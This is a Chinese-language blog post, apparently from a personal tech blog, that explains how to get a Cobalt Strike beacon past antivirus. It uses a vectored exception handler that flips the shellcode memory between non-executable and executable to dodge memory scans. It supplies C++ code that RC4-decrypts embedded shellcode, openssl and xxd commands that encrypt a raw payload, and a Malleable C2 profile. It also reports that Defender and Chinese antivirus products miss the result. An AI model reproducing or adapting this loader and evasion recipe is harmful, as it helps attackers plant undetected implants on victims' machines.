---
title: Bypass AV online CS
copyright: true
categories:
  - 技术水文
abbrlink: 7954ef6a
index_img: https://z3.ax1x.com/2021/12/03/oUqxOS.png
banner_img: https://z3.ax1x.com/2021/12/03/oUqxOS.png
date: 2021-12-03 13:36:22
tags:
---


以下内容基于WBG大佬的：[cs bypass卡巴斯基内存查杀 2](https://xz.aliyun.com/t/9399)  

> 我们知道内存扫描是耗时耗力不管是卡巴还是其他杀软，一般来说都是扫描进程中一些高危的区域比如带有可执行属性的内存区域，既然他扫描带有X（可执行）属性的内存区域那么只要我们去除X属性，那自然就不会被扫也就不会被发现，但问题是去除X属性后Beacon也就跑不起来，但是不用怕我们知道Windows进程触发异常时我们可以对它处理，而此时我们可以在一瞬间恢复内存X属性让它跑起来然后等它再次进入sleep时去除X属性隐藏起来。

概括

> 就是将shellcode的内存属性设置为不可执行，当代码执行到这里会触发异常，这时候，之前创建的veh捕捉到异常--进入到异常处理的函数，函数中修改shellcode为可执行，再执行shellcode，执行完后继续将shellcode内存区域设置为不可执行。

也就是通过手动创建bug来bypass。WBG大佬4月发的文章，时间蛮久了，直接拿来用估计不行，稍做修改。读bin文件操作改为直接赋值并加入经过rc4加密 (https://github.com/bats3c/DefensiveInjector/blob/master/main.c#L124-L183)。

Visual Studio 新建空项目，把WBG大佬给出的demo放入其中，加入以下代码：

```c++
BOOL DecryptShellcode()
{
    BOOL bSuccess = TRUE;

    HCRYPTKEY hCryptoKey;
    HCRYPTHASH hCryptHash;
    HCRYPTPROV hCryptoProv;

    //自定义key
    BYTE* pbKey = "HideMyShellzPlz?";
    DWORD dwLen = strlen(pbKey);

    // get the crypto context
    bSuccess = fnCryptAcquireContextW(&hCryptoProv, NULL, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (!bSuccess)
    {
        //printf("CryptAcquireContextW\n");
        goto CLEANUP;
    }

    // init an create the hashing handle
    bSuccess = fnCryptCreateHash(hCryptoProv, CALG_SHA_256, 0, 0, &hCryptHash);
    if (!bSuccess)
    {
        //printf("CryptCreateHash\n");
        goto CLEANUP;
    }

    // add the key to the hash object
    bSuccess = fnCryptHashData(hCryptHash, pbKey, dwLen, 0);
    if (!bSuccess)
    {
        //printf("CryptHashData\n");
        goto CLEANUP;
    }

    // gen the session keys from the hash
    bSuccess = fnCryptDeriveKey(hCryptoProv, CALG_RC4, hCryptHash, 0,&hCryptoKey);
    if (!bSuccess)
    {
        //printf("CryptDeriveKey\n");
        goto CLEANUP;
    }

    // decrypt the buffer
    bSuccess = fnCryptDecrypt(hCryptoKey, NULL, FALSE, 0, (BYTE*)encmeter_bin, &encmeter_bin_len);
    if (!bSuccess)
    {
        printf("CryptDecrypt: %d\n", GetLastError());
        goto CLEANUP;
    }

    goto CLEANUP;

    CLEANUP:
        fnCryptReleaseContext(hCryptoProv, 0);
        fnCryptDestroyKey(hCryptoKey);
        fnCryptDestroyHash(hCryptHash);

        return bSuccess;
}
```
main

```c++
.......
int main(int argc,  char const *argv[])
{
    // decrypt the shellcode
    if (!DecryptShellcode())
    {
        //printf("[!] Failed to decrypt shellcode\n");
        return -1;
    }
.......
}
```

需要引入detours库

```c++
#include "./include/detours.h"
#include "./include/detver.h"

#pragma comment(lib,"./lib.x64/detours.lib")

```

CS生成raw类型payload，通过opensll进行加密（定义的key需要跟代码中的一致）、xxd转换。

```bash
cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
xxd -i encmeter.bin > encmeter.txt 
```

把转换后的encmeter.txt内容放进带代码中，编译生成。详情见 https://www.bilibili.com/video/BV1yT4y1Z7HW

![](https://z3.ax1x.com/2021/12/03/oULSeg.png)

效果：

Defender、某绒、某数字无感知直接上线并执行命令。据说国内杀软都可以过，这个没去一个个试就不清楚了。

![](https://z3.ax1x.com/2021/12/03/oULPFs.png)

卡巴，不出意外，上线后瞬间就被干掉了....... 

![](https://z3.ax1x.com/2021/12/03/oULpwQ.png)

CS加上C2配置

```yaml
# default sleep time is 60s
set sleeptime "60000";

# jitter factor 0-99% [randomize callback times]
set jitter    "0";

# maximum number of bytes to send in a DNS A record request
set maxdns    "255";

# indicate that this is the default Beacon profile
set sample_name "360";

# define indicators for an HTTP GET
http-get {
    # Beacon will randomly choose from this pool of URIs
    set uri "/test";

    client {
        # base64 encode session metadata and store it in the Cookie header.
        metadata {
            base64;
            header "Cookie";
        }
    }

    server {
        # server should send output with no changes
        header "Content-Type" "application/octet-stream";

        output {
            print;
        }
    }
}

# define indicators for an HTTP POST
http-post {

    set uri "/test.php";

    client {
        header "Content-Type" "application/octet-stream";

        # transmit our session identifier as /submit.php?id=[identifier]
        id {
            parameter "id";
        }

        # post our output with no real changes
        output {
            print;
        }
    }

    # The server's response to our HTTP POST
    server {
        header "Content-Type" "text/html";

        # this will just print an empty string, meh...
        output {
            print;
        }
    }
}

```

然后简单改改特征，如增加资源图标、属性信息之类。

![](https://z3.ax1x.com/2021/12/03/oUL9oj.png)

tasklist /svc

![](https://z3.ax1x.com/2021/12/03/oUqxOS.png)



**Reference**

https://xz.aliyun.com/t/9399

https://github.com/bats3c/DefensiveInjector

https://www.bilibili.com/video/BV1yT4y1Z7HW

https://blog.csdn.net/qing666888/article/details/81540683

https://hjw322.top/win32-trap/

https://blog.csdn.net/qq_45490578/article/details/118991882

https://blog.csdn.net/lynch0571/article/details/33320551

https://blog.csdn.net/oLuoJinFanHua12/article/details/100655719

